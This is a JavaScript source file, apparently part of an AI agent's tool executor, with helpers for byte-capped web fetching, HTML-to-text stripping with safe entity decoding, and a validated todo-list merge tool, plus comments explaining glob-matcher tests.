async function readBodyCapped(res, maxBytes, charset = 'utf-8') {
  // pickCharset has already validated the label, so this can't throw.
  const decoder = new TextDecoder(charset)
  const reader = res.body?.getReader()
  if (!reader) {
    // Defensive fallback for the (unreachable in practice) case where
    // fetch returns no body stream. Use arrayBuffer + TextDecoder so
    // both paths apply the same charset AND the same byte-based cap —
    // res.text() would (a) hard-wire utf-8 in undici and (b) measure
    // the cap in chars, not bytes. Keeps the contract consistent.
    const ab = await res.arrayBuffer()
    const bytes = Buffer.from(ab)
    if (bytes.byteLength > maxBytes) {
      return { text: decoder.decode(bytes.subarray(0, maxBytes)), truncated: true }
    }
    return { text: decoder.decode(bytes), truncated: false }
  }
  const chunks = []
  let total = 0
  let truncated = false
  while (true) {
    const { done, value } = await reader.read()
    if (done) break
    if (!value) continue
    total += value.byteLength
    if (total > maxBytes) {
      const overflow = total - maxBytes
      chunks.push(value.subarray(0, value.byteLength - overflow))
      truncated = true
      try { await reader.cancel() } catch { /* fetch already winding down */ }
      break
    }
    chunks.push(value)
  }
  const buf = Buffer.concat(chunks.map((c) => Buffer.from(c)))
  return { text: decoder.decode(buf), truncated }
}

const HTML_ENTITY_MAP = {
  '&amp;': '&',
  '&lt;': '<',
  '&gt;': '>',
  '&quot;': '"',
  '&apos;': "'",
  '&#39;': "'",
  '&nbsp;': ' ',
}

function stripHtmlToText(html) {
  // 1. Drop <script> and <style> blocks completely (body and all).
  let s = html
    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
    .replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, '')
    .replace(/<!--[\s\S]*?-->/g, '')
  // 2. Treat block-level tags as line breaks so paragraphs don't merge.
  s = s.replace(/<\/?(p|div|h[1-6]|li|tr|br|hr|section|article|header|footer|nav|aside)\b[^>]*>/gi, '\n')
  // 3. Strip remaining tags.
  s = s.replace(/<[^>]+>/g, '')
  // 4. Decode named entities + numeric (decimal + hex) entities.
  s = s.replace(/&(?:amp|lt|gt|quot|apos|#39|nbsp);/g, (m) => HTML_ENTITY_MAP[m])
  s = s.replace(/&#(\d+);/g, (_, n) => safeFromCodePoint(Number(n)))
  s = s.replace(/&#x([0-9a-fA-F]+);/g, (_, h) => safeFromCodePoint(parseInt(h, 16)))
  // 5. Collapse whitespace per line + trim aggressive blank-line runs.
  s = s.split('\n').map((line) => line.replace(/[ \t]+/g, ' ').trim()).join('\n')
  s = s.replace(/\n{3,}/g, '\n\n').trim()
  return s
}

// Unicode code points are 0..0x10FFFF and the surrogate range 0xD800..0xDFFF
// is reserved (passing those to fromCodePoint also throws). Return empty
// string for out-of-range values so a malicious entity like &#9999999999;
// can't crash the entire WebFetch.
function safeFromCodePoint(code) {
  if (!Number.isFinite(code) || code < 0 || code > 0x10FFFF) return ''
  if (code >= 0xD800 && code <= 0xDFFF) return ''
  return String.fromCodePoint(code)
}

function capOutput(text, maxChars) {
  if (text.length <= maxChars) {
    return { output: text, outputTruncated: false }
  }
  return { output: text.slice(0, maxChars), outputTruncated: true }
}

/**
 * Merge a partial todo list into the session's `todoStore` (Map keyed by
 * id). Items in the call replace existing entries with the same id;
 * items not mentioned in the call are preserved (merge semantics — see
 * #4051 acceptance criteria). Validates each item before mutating so a
 * mid-list invalid entry doesn't half-apply the update.
 */
function runTodoWrite({ input, todoStore }) {
  if (!todoStore || !(todoStore instanceof Map)) {
    return {
      content: 'EINTERNAL: TodoWrite requires a session-scoped store (byok-session.js wires this).',
      isError: true,
    }
  }
  const todos = input?.todos
  if (!Array.isArray(todos)) {
    return { content: 'EINVAL: todos must be an array', isError: true }
  }

  // Validate every item BEFORE mutating so a bad item halfway through
  // doesn't leave the store in a partially-applied state.
  const seenIds = new Set()
  for (let i = 0; i < todos.length; i++) {
    const t = todos[i]
    if (!t || typeof t !== 'object') {
      return { content: `EINVAL: todos[${i}] must be an object`, isError: true }
    }
    if (typeof t.id !== 'string' || t.id.length === 0) {
      return { content: `EINVAL: todos[${i}].id is required (string)`, isError: true }
    }
    // #4138: reject duplicate ids within a single call. A duplicate is
    // almost certainly a model bug; rejecting it lets the model see the
    // mistake and self-correct rather than letting the last write win
    // silently. Across separate calls, merge-by-id is unchanged.
    // JSON.stringify on the id (same shape used for `status` below) keeps
    // the error parseable when an id contains quotes / newlines / control
    // chars — raw single-quotes would mangle.
    if (seenIds.has(t.id)) {
      return {
        content: `EINVAL: todos[${i}].id ${JSON.stringify(t.id)} duplicates an earlier entry in this call`,
        isError: true,
      }
    }
    seenIds.add(t.id)
    if (typeof t.content !== 'string' || t.content.length === 0) {
      return { content: `EINVAL: todos[${i}].content is required (string)`, isError: true }
    }
    if (typeof t.status !== 'string' || !TODO_STATUSES.has(t.status)) {
      return {
        content: `EINVAL: todos[${i}].status must be one of pending|in_progress|completed (got ${JSON.stringify(t.status)})`,
        isError: true,
      }
    }
    if (t.activeForm !== undefined && typeof t.activeForm !== 'string') {
      return { content: `EINVAL: todos[${i}].activeForm must be a string when present`, isError: true }
    }
  }

  // Apply the merge.
  for (const t of todos) {
    const entry = { id: t.id, content: t.content, status: t.status }
    if (typeof t.activeForm === 'string') entry.activeForm = t.activeForm
    todoStore.set(t.id, entry)
  }

  // Build a readable summary from the FULL current list (post-merge).
  // The model already sees the call in its history; this confirmation
  // exists so a partial call still surfaces unrelated items. The output
  // is capped so a runaway list (or pathologically long `content`)
  // doesn't balloon conversation history toward token-limit cliffs —
  // the full Map stays server-side; only the rendered summary is capped.
  const all = [...todoStore.values()]
  const counts = { pending: 0, in_progress: 0, completed: 0 }
  for (const t of all) counts[t.status]++

  const header = `Todo list (${all.length} items): ${counts.in_progress} in progress, ${counts.pending} pending, ${counts.completed} completed`
  const visible = all.slice(0, TODOWRITE_MAX_ITEMS_RENDERED)
  const lines = [header]
  for (const t of visible) {
    const marker = t.status === 'completed' ? '[x]' : t.status === 'in_progress' ? '[~]' : '[ ]'
    const content = t.content.length > TODOWRITE_MAX_CONTENT_RENDERED
      ? t.content.slice(0, TODOWRITE_MAX_CONTENT_RENDERED) + '…'
      : t.content
    lines.push(`  ${marker} ${content} (${t.id})`)
  }
  if (all.length > visible.length) {
    lines.push(`  … (showing first ${visible.length} of ${all.length}; full list retained server-side)`)
  }
  return { content: lines.join('\n'), isError: false }
}

const TODOWRITE_MAX_ITEMS_RENDERED = 100
const TODOWRITE_MAX_CONTENT_RENDERED = 200

// Exported for testing — #7898: proving `caseCheckPasses` stays polynomial on
// an adversarial pattern is cheapest called DIRECTLY, without the filesystem
// I/O a full `executeBuiltinTool` Glob call carries. #7901 removed the
// original reason this had to be a direct call rather than an integration
// one (`runGlob`'s walk went through Node's own `fs.glob`, whose matcher had
// an independent, unrelated 87-second backtracking bug on the same pattern
// shapes — see git history on this comment) — `walkGlob` now calls
// `segmentMatches` itself, so the byok-tool-executor.test.js suite ALSO has
// integration-level tests of the same adversarial patterns through the real
// Glob dispatch. Both levels are kept: the direct calls pin the matcher's own
// complexity bound cheaply and precisely; the integration tests prove the
// full tool (root resolution, the deadline race, confinement) stays fast too.
//
// `walkGlob` (#7901) is exported for the same reason: `runGlob`'s own
// deadline/abort RACE (`Promise.race([collect, deadlineReached])`) resolves
// via `deadlineReached` — a timer/abort callback independent of whether the
// walk itself ever notices `state.stop` — so a `executeBuiltinTool`-level
// test proves the TOOL CALL returns promptly on abort, but NOT that the walk
// stops generating filesystem work in the background afterward, which is the
// actual #7356 defect (an orphaned walk left running, and running CPU/RSS,
// after the tool result was already sent). Calling `walkGlob` directly and
// timing how long its OWN promise takes to settle after `state.stop` is set
// proves that property precisely.
export { compileCaseCheck, caseCheckPasses, walkGlob }
